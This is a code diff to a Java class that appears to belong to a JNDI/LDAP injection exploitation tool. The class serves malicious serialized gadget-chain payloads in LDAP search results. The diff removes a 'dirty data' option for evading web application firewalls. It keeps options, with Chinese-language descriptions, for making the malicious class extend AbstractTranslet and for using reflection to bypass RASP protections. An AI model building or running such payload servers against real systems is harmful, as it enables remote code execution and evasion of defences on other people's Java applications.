@@ -33,16 +33,13 @@ public class SerializedDataController implements LdapController {
 
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
-        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Send LDAP result for |@" + base + " @|MAGENTA with javaSerializedData attribute|@"));
+        System.out.println(ansi().render("@|green [+]|@Send LDAP result for" + base + " with javaSerializedData attribute"));
         Entry e = new Entry(base);
 
         try {
             final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(String.valueOf(gadgetType));
             ObjectPayload                        payload      = payloadClass.newInstance();
             Object                               object       = payload.getObject(payloadType, params);
-            if (dirtyType && dirtyLength) {
-                object = new DirtyDataWrapper(object, Type1, Length1).doWrap();
-            }
 
             ByteArrayOutputStream out   = new ByteArrayOutputStream();
             byte[]                bytes = Serializer.serialize(object, out);
@@ -85,8 +82,6 @@ public class SerializedDataController implements LdapController {
                     Options  options = new Options();
                     options.addOption("a", "AbstractTranslet", false, "恶意类是否继承 AbstractTranslet");
                     options.addOption("o", "obscure", false, "使用反射绕过");
-                    options.addOption("dt", "dirty-type", true, "Using dirty data to bypass WAF，type: 1:Random Hashable Collections/2:LinkedList Nesting/3:TC_RESET in Serialized Data");
-                    options.addOption("dl", "dirty-length", true, "Length of dirty data when using type 1 or 3/Counts of Nesting loops when using type 2");
                     options.addOption("j", "jboss", false, "Using JBoss ObjectInputStream/ObjectOutputStream");
                     CommandLineParser parser = new DefaultParser();
 
@@ -101,24 +96,12 @@ public class SerializedDataController implements LdapController {
 
                     if (cmdLine.hasOption("obscure")) {
                         IS_OBSCURE = true;
-                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 使用反射绕过RASP |@"));
+                        System.out.println(ansi().render("@|green [+]|@ 使用反射绕过RASP "));
                     }
 
                     if (cmdLine.hasOption("AbstractTranslet")) {
                         IS_INHERIT_ABSTRACT_TRANSLET = true;
                         System.out.println("[+] 继承恶意类AbstractTranslet");
-                    }
-
-                    if (cmdLine.hasOption("dirty-type")) {
-                        dirtyType = true;
-                        Type1 = Integer.parseInt(cmdLine.getOptionValue("dirty-type"));
-                        System.out.println("[+] 脏数据类型：" + Type1);
-                    }
-
-                    if (cmdLine.hasOption("dirty-length")) {
-                        IS_JBOSS_OBJECT_INPUT_STREAM = true;
-                        Length1 = Integer.parseInt(cmdLine.getOptionValue("dirty-length"));
-                        System.out.println("[+] 脏数据长度：" + Length1);
                     }
 
                     if (cmdLine.hasOption("jboss")) {
